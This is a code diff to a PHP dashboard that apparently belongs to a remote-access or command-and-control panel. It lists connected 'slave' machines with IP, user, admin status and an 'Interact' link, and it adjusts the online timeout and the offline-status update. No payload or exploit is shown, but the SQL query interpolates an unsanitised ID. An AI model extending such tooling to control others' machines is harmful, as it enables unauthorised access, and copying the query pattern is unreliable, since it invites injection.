@@ -172,13 +172,15 @@ reload();
 		    $timeDiff = $row["timestamp"];
 		    $wTime = $row["slaveWaitTime"];
 
-			      if($row["slaveStatus"] == "online" && abs($timeDiff) < $wTime + 5){
+			      if($row["slaveStatus"] == "online" && abs($timeDiff) < $wTime + 8){
                         $status = "<span class='badge badge-success'>Online</span>";
                     echo "<tr name=\"online\">"."<td>". $num . "</td>"."<td>" . htmlspecialchars($row['slaveId']) . "</td>" . "<td>".  htmlspecialchars($row["slaveIp"]) . "</td>" . "<td>" . htmlspecialchars($row["slaveOperatingSystem"]) ."</td>". "<td>" . htmlspecialchars($row["slaveUser"]) ."</td>" . "<td>" . htmlspecialchars($row["slaveMachineName"]) ."</td>"."<td>" . htmlspecialchars($row["slaveIsAdmin"]) ."</td>"."<td>" . $status . "</td>". "<td>"."<a class='btn btn-sm btn-dark'". "href='/interact.php?slave=". htmlspecialchars($slaveid) . "&sid=". htmlspecialchars($slaveid). "' target=\"_blank\">Interact</a>". "</td>" ."</tr>";
                     $num++;
                   }
                   else{
-			$conn->query("update slaves set slaveStatus='offline' where slaveId='$slaveid'");
+                      if($row["slaveStatus"] == "online"){
+			    $conn->query("update slaves set slaveStatus='offline' where slaveId='$slaveid'");
+                          }
                     $status = "<span class='badge badge-danger'>Offline</span>";
                echo "<tr id=\"offline\">"."<td>". $num . "</td>"."<td>" . htmlspecialchars($row['slaveId']) . "</td>" . "<td>".  htmlspecialchars($row["slaveIp"]) . "</td>" . "<td>" . htmlspecialchars($row["slaveOperatingSystem"]) ."</td>". "<td>" . htmlspecialchars($row["slaveUser"]) ."</td>" . "<td>" . htmlspecialchars($row["slaveMachineName"]) ."</td>"."<td>" . htmlspecialchars($row["slaveIsAdmin"]) ."</td>"."<td>" . $status . "</td>". "<td>"."<a class='btn btn-sm btn-dark'". "href='/interact.php?slave=". htmlspecialchars($slaveid) . "&sid=". htmlspecialchars($slaveid). "' target=\"_blank\">Interact</a>". "</td>" ."</tr>";
                 $num++;
@@ -225,4 +227,3 @@ reload();
 </body>
 
 </html>
-
